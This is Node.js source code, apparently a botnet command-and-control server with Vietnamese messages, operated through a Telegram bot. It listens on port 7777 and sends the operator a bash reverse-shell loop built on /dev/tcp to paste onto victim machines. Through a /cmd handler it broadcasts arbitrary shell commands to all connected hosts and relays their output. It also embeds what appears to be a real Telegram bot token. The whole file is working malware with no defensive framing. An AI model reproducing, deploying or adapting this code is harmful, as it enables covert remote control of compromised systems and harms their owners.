const net=require('net'),TelegramBot=require('node-telegram-bot-api'),https=require('https');
const token='8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc',chatIdAdmin=7371969470;
const bot=new TelegramBot(token,{polling:true}),clients=new Map(),cmdQueue=new Map();
let botCounter=1,currentCmdId=0;

function disconnect(s){if(!clients.has(s))return;const b=clients.get(s);clients.delete(s);cmdQueue.delete(s);try{s.destroy()}catch{}bot.sendMessage(chatIdAdmin,`[-] Bot mất kết nối: Bot ${b.id} - ${b.ip}:${b.port}`);}
function resetIds(){let id=1;clients.forEach(b=>b.id=id++);botCounter=id;}
function sendSlaveCmd(){https.get('https://api.ipify.org?format=json',res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{let ip;try{ip=JSON.parse(d).ip}catch{ip='YOUR_PUBLIC_IP'};const cmd=`while true;do if ! exec 3<>/dev/tcp/${ip}/7777;then sleep 2;continue;fi;while read -r c <&3;do [[ -z "$c" ]]&&continue;if [[ "$c" == "uptime -p" ]];then uptime -p >&3;else (timeout 300 bash -c "$c" 2>&1;echo "CMD_DONE_$?")|while read -r l;do echo "$l" >&3||break;done;fi;done;done`;bot.sendMessage(chatIdAdmin,`🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave:\n\`\`\`bash\n${cmd}\n\`\`\``,{parse_mode:'Markdown'});});}).on('error',()=>sendSlaveCmd());}

const server=net.createServer(s=>{
s.setKeepAlive(true,100);const ip=s.remoteAddress.replace(/^.*:/,''),port=s.remotePort;clients.set(s,{id:botCounter++,ip,port,lastResponse:Date.now(),uptime:'chưa cập nhật',socket:s});bot.sendMessage(chatIdAdmin,`[+] Bot kết nối: Bot ${botCounter-1} - ${ip}:${port}`);
let buf='';s.on('data',d=>{
buf+=d.toString();const lines=buf.split('\n');buf=lines.pop();for(const l of lines){
if(!l.trim())continue;if(!clients.has(s))continue;const b=clients.get(s);b.lastResponse=Date.now();
if(l.startsWith('up '))b.uptime=l.trim();else if(l.includes('CMD_DONE_')){if(cmdQueue.has(s)){const{cmdId,data}=cmdQueue.get(s);if(data.trim().length>0)bot.sendMessage(chatIdAdmin,`🖥 Bot ${b.id} [${b.ip}]:\n\`\`\`\n${data.trim()}\`\`\``,{parse_mode:'Markdown'});cmdQueue.delete(s);}}else{if(cmdQueue.has(s))cmdQueue.get(s).data+=l+'\n';}}});s.on('error',()=>disconnect(s));s.on('close',()=>disconnect(s));});

server.listen(7777,()=>{console.log('[*] Server listening on port 7777');sendSlaveCmd();});

setInterval(()=>{const n=Date.now();clients.forEach((b,s)=>{if(n-b.lastResponse>3000)disconnect(s);else try{s.write('uptime -p\n')}catch{disconnect(s)}});resetIds();},1000);

bot.onText(/^\/listbot$/,msg=>{if(msg.chat.id!==chatIdAdmin)return;if(clients.size===0)return bot.sendMessage(chatIdAdmin,'❌ Không có bot nào kết nối.');let t=`🤖 Có ${clients.size} bot đang kết nối:\n`;clients.forEach(b=>t+=`Bot ${b.id} - [${b.ip}:${b.port}] - Uptime: ${b.uptime}\n`);bot.sendMessage(chatIdAdmin,t);});

bot.onText(/^\/cmd (.+)/,(msg,m)=>{if(msg.chat.id!==chatIdAdmin)return;const c=m[1].trim();if(!c)return bot.sendMessage(chatIdAdmin,'❌ Vui lòng nhập lệnh: `/cmd <lệnh>`',{parse_mode:'Markdown'});if(clients.size===0)return bot.sendMessage(chatIdAdmin,'❌ Không có bot nào kết nối.');currentCmdId++;const id=currentCmdId;clients.forEach((b,s)=>{cmdQueue.set(s,{cmdId:id,data:''});try{s.write(`${c}\n`)}catch{disconnect(s)}});bot.sendMessage(chatIdAdmin,`✅ Đã gửi lệnh đến ${clients.size} bot:\n\`${c}\``,{parse_mode:'Markdown'});setTimeout(()=>{cmdQueue.forEach((q,s)=>{if(q.cmdId===id&&q.data&&clients.has(s)){const b=clients.get(s);bot.sendMessage(chatIdAdmin,`🖥 Bot ${b.id} [${b.ip}]:\n\`\`\`\n${q.data.trim()}\`\`\``,{parse_mode:'Markdown'});cmdQueue.delete(s);}});},30000);});
